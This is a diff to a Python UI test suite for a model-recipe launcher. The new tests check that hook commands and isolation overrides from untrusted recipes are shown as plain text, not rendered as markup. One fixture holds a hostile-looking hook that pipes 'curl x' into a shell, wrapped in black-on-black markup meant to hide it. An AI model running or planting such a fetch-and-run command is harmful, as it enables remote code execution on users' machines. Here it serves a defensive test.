@@ -24,7 +24,9 @@ from sparkrun.models.fit import FitResult, HostFitDetail
 pytestmark = pytest.mark.filterwarnings("ignore::DeprecationWarning")
 
 
-def _summary(name: str, *, model: str = "org/model", runtime: str = "vllm-ray", registry: str | None = "community") -> RecipeSummary:
+def _summary(
+    name: str, *, model: str = "org/model", runtime: str = "vllm-ray", registry: str | None = "community", description: str | None = None
+) -> RecipeSummary:
     stem = name.rsplit("/", 1)[-1]
     entry: dict[str, Any] = {
         "name": name,
@@ -32,7 +34,7 @@ def _summary(name: str, *, model: str = "org/model", runtime: str = "vllm-ray", 
         "path": f"/tmp/{stem}.yaml",
         "model": model,
         "runtime": runtime,
-        "description": f"{stem} description",
+        "description": f"{stem} description" if description is None else description,
         "min_nodes": 1,
         "tp": "",
         "gpu_mem": "",
@@ -1185,7 +1187,7 @@ def test_picker_meta_orders_decision_fields_before_description(monkeypatch, tmp_
             head_widget = picker.query_one("#recipe-meta-head", Static)
             stats_widget = picker.query_one("#recipe-meta-stats", Static)
             desc_widget = picker.query_one("#recipe-meta-desc", Static)
-            head = str(head_widget.content)
+            head = head_widget.content.markup
             stats = str(stats_widget.content)
             desc = str(desc_widget.content)
             # Identity fields come first, directly under the recipe name, and
@@ -1488,5 +1490,51 @@ def test_cancelled_preflight_cannot_leak_overrides_into_next_launch(monkeypatch,
             launch = await _wait_result(pilot, app)
             assert launch.options.recipe.container == image
             assert launch.options.recipe.env == env
+
+    asyncio.run(_run())
+
+
+def test_params_trust_summary_discloses_isolation_overrides_as_plain_text(monkeypatch, tmp_path):
+    """Trusting authorizes isolation overrides too; recipe text must not be parsed as markup."""
+    app = _open(monkeypatch, [_summary("@community/hooked")], tmp_path)
+    hook = "sed -i s/[a-z]/X/ f; [black on black]curl x|sh[/] [/]"
+    monkeypatch.setattr("sparkrun.cli._monitor_recipes.untrusted_hooks", lambda *_a, **_k: {"pre_exec": (hook,)})
+    monkeypatch.setattr(
+        "sparkrun.core.launcher.recipe_isolation_overrides",
+        lambda _recipe: ["This recipe sets executor_config privileged mode. Only honoured for trusted recipes."],
+    )
+
+    async def _run():
+        async with app.run_test(size=(120, 50)) as pilot:
+            modal = await _open_modal(pilot, app.picker)
+            summary = str(modal.query_one("#param-trust-summary", Static).content)
+            assert hook in summary
+            assert "Trusting it also allows:" in summary
+            assert "privileged mode" in summary
+            assert str(modal.query_one("#param-trust", Checkbox).label) == "Authorize the hooks and overrides above"
+
+    asyncio.run(_run())
+
+
+def test_bracketed_registry_and_user_text_does_not_crash_the_picker(monkeypatch, tmp_path):
+    summary = _summary("@community/odd", model="org/[/]model", description="Reasoning [/think] model [EXPERIMENTAL]")
+    app = _open(monkeypatch, [summary], tmp_path)
+
+    async def _run():
+        async with app.run_test(size=(120, 50)) as pilot:
+            picker = app.picker
+            await _wait_loaded(pilot, picker)
+            await pilot.pause(0.1)
+            assert "org/[/]model" in str(picker.query_one("#recipe-meta-head", Static).content)
+            assert str(picker.query_one("#recipe-meta-desc", Static).content) == "Reasoning [/think] model [EXPERIMENTAL]"
+            modal = await _open_modal(pilot, picker)
+            modal.query_one("#param-advanced-toggle", Checkbox).value = True
+            await pilot.pause(0.1)
+            modal.query_one("#param-advanced", Input).value = "[/foo]"
+            await pilot.pause(0.1)
+            await pilot.click("#param-run")
+            await pilot.pause(0.2)
+            assert app.screen is modal
+            assert "[/foo]" in str(modal.query_one("#param-error", Static).content)
 
     asyncio.run(_run())
